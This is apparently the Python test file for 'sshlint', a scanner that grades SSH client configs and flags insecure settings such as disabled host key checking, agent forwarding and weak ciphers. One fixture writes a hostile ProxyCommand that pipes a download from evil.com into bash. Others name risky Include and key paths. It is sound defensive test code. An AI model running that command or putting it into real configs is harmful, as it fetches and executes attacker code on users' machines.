#!/usr/bin/env python3
"""Tests for sshlint."""

import os
import stat
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from sshlint import scan_config, ScanResult, Severity, format_text, format_json, parse_ssh_config
from pathlib import Path


# ── Helpers ─────────────────────────────────────────────────────────

def make_config(tmpdir: str, content: str, name: str = "config",
                mode: int = 0o600) -> Path:
    """Create a temp SSH config file."""
    ssh_dir = os.path.join(tmpdir, ".ssh")
    os.makedirs(ssh_dir, exist_ok=True)
    config_path = os.path.join(ssh_dir, name)
    with open(config_path, "w") as f:
        f.write(content)
    os.chmod(config_path, mode)
    return Path(config_path)


def assert_finding(result: ScanResult, rule_id: str, severity: Severity = None) -> None:
    matching = [f for f in result.findings if f.rule_id == rule_id]
    assert matching, f"Expected finding {rule_id} but got: {[f.rule_id for f in result.findings]}"
    if severity:
        assert any(f.severity == severity for f in matching), \
            f"Expected {rule_id} with severity {severity.value} but got {[f.severity.value for f in matching]}"


def assert_no_finding(result: ScanResult, rule_id: str) -> None:
    matching = [f for f in result.findings if f.rule_id == rule_id]
    assert not matching, f"Unexpected finding {rule_id}: {[f.message for f in matching]}"


# ── Parser Tests ────────────────────────────────────────────────────

def test_parse_empty():
    blocks, glob = parse_ssh_config("")
    assert len(blocks) == 0
    assert glob.patterns == ["*"]
    print("  ✓ test_parse_empty")


def test_parse_global_opts():
    blocks, glob = parse_ssh_config("ServerAliveInterval 60\nServerAliveCountMax 3\n")
    assert "serveraliveinterval" in glob.options
    assert glob.options["serveraliveinterval"] == ("60", 1)
    print("  ✓ test_parse_global_opts")


def test_parse_host_blocks():
    content = """Host github.com
  IdentityFile ~/.ssh/id_github

Host *.internal
  ForwardAgent yes

Host *
  ServerAliveInterval 60
"""
    blocks, glob = parse_ssh_config(content)
    assert len(blocks) == 3
    assert blocks[0].patterns == ["github.com"]
    assert blocks[1].patterns == ["*.internal"]
    assert blocks[1].is_wildcard
    assert blocks[2].patterns == ["*"]
    print("  ✓ test_parse_host_blocks")


def test_parse_equals_syntax():
    content = "Host myhost\n  User=admin\n  Port=2222\n"
    blocks, _ = parse_ssh_config(content)
    assert blocks[0].options["user"] == ("admin", 2)
    assert blocks[0].options["port"] == ("2222", 3)
    print("  ✓ test_parse_equals_syntax")


# ── Rule Tests ──────────────────────────────────────────────────────

def test_clean_config():
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, """
Host github.com
  IdentityFile ~/.ssh/id_ed25519
  User git

Host production
  HostName 10.0.0.1
  User deploy
  IdentityFile ~/.ssh/id_deploy
""")
        result = scan_config(path, check_permissions=False)
        non_info = [f for f in result.findings if f.severity != Severity.INFO]
        assert not non_info, f"Clean config got findings: {[(f.rule_id, f.message) for f in non_info]}"
        assert result.grade == "A+"
        print("  ✓ test_clean_config")


def test_sl001_strict_host_key_no():
    """SL001: StrictHostKeyChecking no."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host *\n  StrictHostKeyChecking no\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL001", Severity.CRITICAL)
        print("  ✓ test_sl001_strict_host_key_no")


def test_sl001_strict_host_key_specific():
    """SL001: StrictHostKeyChecking no on specific host (HIGH, not CRITICAL)."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host legacy-box\n  StrictHostKeyChecking no\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL001", Severity.HIGH)
        print("  ✓ test_sl001_strict_host_key_specific")


def test_sl001_accept_new():
    """SL001: accept-new is LOW risk."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host *\n  StrictHostKeyChecking accept-new\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL001", Severity.LOW)
        print("  ✓ test_sl001_accept_new")


def test_sl002_forward_agent_wildcard():
    """SL002: ForwardAgent yes on wildcard (HIGH)."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host *\n  ForwardAgent yes\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL002", Severity.HIGH)
        print("  ✓ test_sl002_forward_agent_wildcard")


def test_sl002_forward_agent_specific():
    """SL002: ForwardAgent yes on specific host (MEDIUM)."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host bastion\n  ForwardAgent yes\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL002", Severity.MEDIUM)
        print("  ✓ test_sl002_forward_agent_specific")


def test_sl003_permit_local_command():
    """SL003: PermitLocalCommand yes."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host dev\n  PermitLocalCommand yes\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL003", Severity.MEDIUM)
        print("  ✓ test_sl003_permit_local_command")


def test_sl004_known_hosts_devnull():
    """SL004: UserKnownHostsFile /dev/null."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host *\n  UserKnownHostsFile /dev/null\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL004", Severity.CRITICAL)
        print("  ✓ test_sl004_known_hosts_devnull")


def test_sl005_weak_ciphers():
    """SL005: Weak ciphers."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host legacy\n  Ciphers 3des-cbc,aes128-ctr\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL005", Severity.HIGH)
        print("  ✓ test_sl005_weak_ciphers")


def test_sl005_strong_ciphers_ok():
    """SL005: Strong ciphers should not trigger."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host *\n  Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com\n")
        result = scan_config(path, check_permissions=False)
        assert_no_finding(result, "SL005")
        print("  ✓ test_sl005_strong_ciphers_ok")


def test_sl006_weak_macs():
    """SL006: Weak MACs."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host old-server\n  MACs hmac-md5,hmac-sha2-256\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL006", Severity.HIGH)
        print("  ✓ test_sl006_weak_macs")


def test_sl007_weak_kex():
    """SL007: Weak key exchange."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host old\n  KexAlgorithms diffie-hellman-group1-sha1\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL007", Severity.HIGH)
        print("  ✓ test_sl007_weak_kex")


def test_sl008_weak_hostkey():
    """SL008: Weak host key algorithms."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host old\n  HostKeyAlgorithms ssh-dss\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL008", Severity.MEDIUM)
        print("  ✓ test_sl008_weak_hostkey")


def test_sl009_proxy_command_injection():
    """SL009: Dangerous ProxyCommand."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host evil\n  ProxyCommand curl http://evil.com/payload | bash\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL009", Severity.HIGH)
        print("  ✓ test_sl009_proxy_command_injection")


def test_sl009_safe_proxy_command():
    """SL009: Normal ProxyCommand should not trigger."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host bastion-target\n  ProxyCommand ssh -W %h:%p bastion\n")
        result = scan_config(path, check_permissions=False)
        assert_no_finding(result, "SL009")
        print("  ✓ test_sl009_safe_proxy_command")


def test_sl010_tunnel():
    """SL010: Tunnel enabled."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host vpn\n  Tunnel point-to-point\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL010", Severity.MEDIUM)
        print("  ✓ test_sl010_tunnel")


def test_sl011_password_auth():
    """SL011: PasswordAuthentication yes."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host dev\n  PasswordAuthentication yes\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL011", Severity.LOW)
        print("  ✓ test_sl011_password_auth")


def test_sl011_password_preferred():
    """SL011: Password as first preferred auth."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host dev\n  PreferredAuthentications password,publickey\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL011", Severity.MEDIUM)
        print("  ✓ test_sl011_password_preferred")


def test_sl012_port_forwarding():
    """SL012: Port forwarding configured."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host db-tunnel\n  LocalForward 5432 db.internal:5432\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL012", Severity.MEDIUM)  # Sensitive port
        print("  ✓ test_sl012_port_forwarding")


def test_sl014_x11_forwarding():
    """SL014: X11 forwarding enabled."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host dev\n  ForwardX11 yes\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL014", Severity.LOW)
        print("  ✓ test_sl014_x11_forwarding")


def test_sl014_x11_trusted():
    """SL014: X11 trusted forwarding (higher risk)."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host *\n  ForwardX11 yes\n  ForwardX11Trusted yes\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL014", Severity.HIGH)
        print("  ✓ test_sl014_x11_trusted")


def test_sl015_loglevel_quiet():
    """SL015: LogLevel QUIET."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host *\n  LogLevel QUIET\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL015", Severity.LOW)
        print("  ✓ test_sl015_loglevel_quiet")


def test_sl017_include_tmp():
    """SL017: Include from /tmp."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Include /tmp/evil_ssh_config\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL017", Severity.HIGH)
        print("  ✓ test_sl017_include_tmp")


def test_sl017_include_traversal():
    """SL017: Include with path traversal."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Include ../../etc/ssh/evil\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL017", Severity.HIGH)
        print("  ✓ test_sl017_include_traversal")


def test_sl018_config_permissions():
    """SL018: World-readable SSH config."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host dev\n  User admin\n", mode=0o644)
        result = scan_config(path, check_permissions=True)
        assert_finding(result, "SL018", Severity.MEDIUM)
        print("  ✓ test_sl018_config_permissions")


def test_sl019_key_permissions():
    """SL019: Private key with open permissions."""
    with tempfile.TemporaryDirectory() as tmpdir:
        ssh_dir = os.path.join(tmpdir, ".ssh")
        os.makedirs(ssh_dir, exist_ok=True)
        config_path = os.path.join(ssh_dir, "config")
        with open(config_path, "w") as f:
            f.write("Host dev\n  User admin\n")
        os.chmod(config_path, 0o600)
        # Create a private key with bad permissions
        key_path = os.path.join(ssh_dir, "id_ed25519")
        with open(key_path, "w") as f:
            f.write("-----BEGIN OPENSSH PRIVATE KEY-----\nfakekey\n-----END OPENSSH PRIVATE KEY-----\n")
        os.chmod(key_path, 0o644)
        result = scan_config(Path(config_path), check_permissions=True)
        assert_finding(result, "SL019")  # CRITICAL for world-readable, HIGH for group-only
        print("  ✓ test_sl019_key_permissions")


def test_sl020_dsa_key():
    """SL020: DSA key reference."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host old\n  IdentityFile ~/.ssh/id_dsa\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL020", Severity.HIGH)
        print("  ✓ test_sl020_dsa_key")


def test_sl020_temp_key():
    """SL020: Key in /tmp."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host dev\n  IdentityFile /tmp/stolen_key\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL020", Severity.HIGH)
        print("  ✓ test_sl020_temp_key")


def test_sl021_deprecated_protocol():
    """SL021: Protocol 1 (deprecated)."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Protocol 1,2\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL021", Severity.CRITICAL)
        print("  ✓ test_sl021_deprecated_protocol")


def test_sl021_deprecated_roaming():
    """SL021: UseRoaming (CVE-2016-0777)."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "UseRoaming yes\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL021", Severity.MEDIUM)
        print("  ✓ test_sl021_deprecated_roaming")


def test_sl022_control_path_tmp():
    """SL022: ControlPath in /tmp."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host *\n  ControlMaster auto\n  ControlPath /tmp/ssh-%r@%h:%p\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL022", Severity.MEDIUM)
        print("  ✓ test_sl022_control_path_tmp")


def test_sl022_control_path_predictable():
    """SL022: Predictable ControlPath."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/master-socket\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL022", Severity.LOW)
        print("  ✓ test_sl022_control_path_predictable")


def test_combined_disaster():
    """Multiple bad settings should all be caught."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, """
Host *
  StrictHostKeyChecking no
  UserKnownHostsFile /dev/null
  ForwardAgent yes
  ForwardX11 yes
  ForwardX11Trusted yes
  Ciphers 3des-cbc,aes128-ctr
  MACs hmac-md5,hmac-sha2-256
  KexAlgorithms diffie-hellman-group1-sha1
  LogLevel QUIET
""")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL001")
        assert_finding(result, "SL002")
        assert_finding(result, "SL004")
        assert_finding(result, "SL005")
        assert_finding(result, "SL006")
        assert_finding(result, "SL007")
        assert_finding(result, "SL014")
        assert_finding(result, "SL015")
        assert result.grade == "F", f"Expected F got {result.grade}"
        print("  ✓ test_combined_disaster")


def test_json_output():
    """JSON output should be valid."""
    import json as json_mod
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host *\n  StrictHostKeyChecking no\n")
        result = scan_config(path, check_permissions=False)
        output = format_json(result)
        data = json_mod.loads(output)
        assert "grade" in data
        assert "findings" in data
        assert data["score"] > 0
        print("  ✓ test_json_output")


def test_text_output():
    """Text output should contain key info."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host *\n  ForwardAgent yes\n")
        result = scan_config(path, check_permissions=False)
        output = format_text(result, verbose=True, color=False)
        assert "sshlint" in output
        assert "SL002" in output
        assert "ForwardAgent" in output
        print("  ✓ test_text_output")


def test_empty_config():
    """Empty config should be safe."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "")
        result = scan_config(path, check_permissions=False)
        assert result.grade == "A+"
        print("  ✓ test_empty_config")


def test_comments_only():
    """Config with only comments should be safe."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "# This is a comment\n# Another comment\n")
        result = scan_config(path, check_permissions=False)
        assert result.grade == "A+"
        print("  ✓ test_comments_only")


def test_multiple_hosts():
    """Only specific host should trigger, not clean ones."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, """
Host safe-host
  IdentityFile ~/.ssh/id_ed25519
  User deploy

Host risky-host
  ForwardAgent yes
  StrictHostKeyChecking no
""")
        result = scan_config(path, check_permissions=False)
        # Check that findings reference the right host
        agent_findings = [f for f in result.findings if f.rule_id == "SL002"]
        assert agent_findings
        assert "risky-host" in agent_findings[0].host
        print("  ✓ test_multiple_hosts")


def test_append_syntax():
    """Handle +cipher append syntax."""
    with tempfile.TemporaryDirectory() as tmpdir:
        path = make_config(tmpdir, "Host old\n  Ciphers +3des-cbc\n")
        result = scan_config(path, check_permissions=False)
        assert_finding(result, "SL005", Severity.HIGH)
        print("  ✓ test_append_syntax")


# ── Run ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    tests = [
        test_parse_empty,
        test_parse_global_opts,
        test_parse_host_blocks,
        test_parse_equals_syntax,
        test_clean_config,
        test_sl001_strict_host_key_no,
        test_sl001_strict_host_key_specific,
        test_sl001_accept_new,
        test_sl002_forward_agent_wildcard,
        test_sl002_forward_agent_specific,
        test_sl003_permit_local_command,
        test_sl004_known_hosts_devnull,
        test_sl005_weak_ciphers,
        test_sl005_strong_ciphers_ok,
        test_sl006_weak_macs,
        test_sl007_weak_kex,
        test_sl008_weak_hostkey,
        test_sl009_proxy_command_injection,
        test_sl009_safe_proxy_command,
        test_sl010_tunnel,
        test_sl011_password_auth,
        test_sl011_password_preferred,
        test_sl012_port_forwarding,
        test_sl014_x11_forwarding,
        test_sl014_x11_trusted,
        test_sl015_loglevel_quiet,
        test_sl017_include_tmp,
        test_sl017_include_traversal,
        test_sl018_config_permissions,
        test_sl019_key_permissions,
        test_sl020_dsa_key,
        test_sl020_temp_key,
        test_sl021_deprecated_protocol,
        test_sl021_deprecated_roaming,
        test_sl022_control_path_tmp,
        test_sl022_control_path_predictable,
        test_combined_disaster,
        test_json_output,
        test_text_output,
        test_empty_config,
        test_comments_only,
        test_multiple_hosts,
        test_append_syntax,
    ]

    passed = 0
    failed = 0
    errors = []

    print(f"\nRunning {len(tests)} tests...\n")

    for test in tests:
        try:
            test()
            passed += 1
        except Exception as e:
            failed += 1
            errors.append((test.__name__, str(e)))
            print(f"  ✗ {test.__name__}: {e}")

    print(f"\n{'─' * 40}")
    print(f"  Passed: {passed}/{len(tests)}")
    if failed:
        print(f"  Failed: {failed}")
        for name, err in errors:
            print(f"    {name}: {err}")
        sys.exit(1)
    else:
        print("  All tests passed! ✓")
        sys.exit(0)
